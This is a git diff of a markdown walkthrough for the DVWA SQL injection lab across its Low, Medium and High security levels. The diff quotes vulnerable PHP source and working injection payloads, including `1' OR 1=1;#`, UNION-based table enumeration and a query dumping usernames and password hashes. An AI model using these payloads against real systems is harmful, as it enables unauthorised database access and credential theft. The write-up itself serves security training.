@@ -5,7 +5,7 @@
   <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql1.png?raw=true">
 </p>
 
-Inserting `1'` will return a 500 Internal Server Error.
+Inserting `1'` will return an error, that's means that SQL Injection could be possible.
 
 Visiting the source code we can find:
 ```php
@@ -23,13 +23,13 @@ while( $row = mysqli_fetch_assoc( $result ) ) {
     echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
 ```
 
-We can see that the `'$id'` is not verified, so we can inject the following: `1' OR 1=1;#`
+We can see that the `'$id'` is not validated or sanitized in any way, so we can inject the following: `1' OR 1=1;#`
 
 <p align="center">
   <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql2.png?raw=true">
 </p>
 
-With this payload we bypass the query using the quote symbol and add the logic operator OR, which will make the query to choose between the id given or a true statement such as 1=1.
+With this payload we bypass the query using the quote symbol and add the logic operator `OR`, which will make the query to choose between the id given or a true statement such as 1=1.
 The pound sign `#` is used to comment the rest of the query.
 
 So, the query executed will look like this:
@@ -50,13 +50,14 @@ Now we got the version of the database.
 First, we need to enumerate the columns using `UNION SELECT null,null`, and we add null values until we will get a valid response.
 Keep in mind that `@@version` syntax will only work for MySQL dbs.
 
+Using `database()` function we can find the name of the database.
+
 <p align="center">
   <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql9.png?raw=true">
 </p>
 
-Using `database()` function we can find the name of the database.
 Now we can enumerate the tables, the columns and extract the values.
-For the next queries I changed the syntax a little bit.
+For the next queries I changed the syntax a little bit.	
 
 ```sql
 1' UNION SELECT null,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa'#
@@ -75,7 +76,7 @@ For the next queries I changed the syntax a little bit.
 </p>
 
 ```sql
-1' UNION SELECT null,group_concat(user,':',password SEPARATOR '<br>') FROM users#
+1' UNION SELECT user, password FROM users#
 ```
 
 <p align="center">
@@ -108,23 +109,83 @@ For the Medium security level we can not change the value of the parameter direc
   <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql4.png?raw=true">
 </p>
 
-We will add the payload without the quote because now the $id is treated as integer. Then we URL encode the payload and send it.
+We will add the payload without the quote because now the $id does not need anymore. Then we URL encode the payload and send it.
 
 <p align="center">
   <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql5.png?raw=true">
 </p>
 
+The same enumeration using UNION method is still working.
+
 Source code:
 ```php
-$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
-$result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
+// Get input
+$id = $_POST[ 'id' ];
 
-// Get results
-while( $row = mysqli_fetch_assoc( $result ) ) {
-    // Display values
-    $first = $row["first_name"];
-    $last  = $row["last_name"];
+$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
 
-    // Feedback for end user
-    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+switch ($_DVWA['SQLI_DB']) {
+    case MYSQL:
+        $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+        $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
+
+        // Get results
+        while( $row = mysqli_fetch_assoc( $result ) ) {
+            // Display values
+            $first = $row["first_name"];
+            $last  = $row["last_name"];
+
+            // Feedback for end user
+            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+        }
+        break;
 ```
+
+What is different here is the presence of `mysqli_real_escape_string()` which is escaping the following characters:
+```
+NUL (ASCII 0), \n, \r, \, ', ", and CTRL+Z
+```
+The problem is that the quote is not needed anymore and the other symbols are not affecting us.
+
+## High Security
+
+For the High level of security the source code looks like this:
+```sql
+if( isset( $_SESSION [ 'id' ] ) ) {
+    // Get input
+    $id = $_SESSION[ 'id' ];
+
+    switch ($_DVWA['SQLI_DB']) {
+        case MYSQL:
+            // Check database
+            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
+
+            // Get results
+            while( $row = mysqli_fetch_assoc( $result ) ) {
+                // Get values
+                $first = $row["first_name"];
+                $last  = $row["last_name"];
+
+                // Feedback for end user
+                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+            }
+
+            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
+            break; 
+```
+For this exercise a new window for the input will open, so the input is transferred using another page.
+
+<p align="center">
+  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql6.png?raw=true">
+</p>
+
+As we can see the `$id` is still sent unsecured.
+In this query we have a `LIMIT 1` which will make the query to return only one record from the database, but this can still be commented using injection with `#` symbol.
+In this case, the same payloads will work for High security level.
+
+<p align="center">
+  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql7.png?raw=true">
+</p>
+
+## Impossible Security
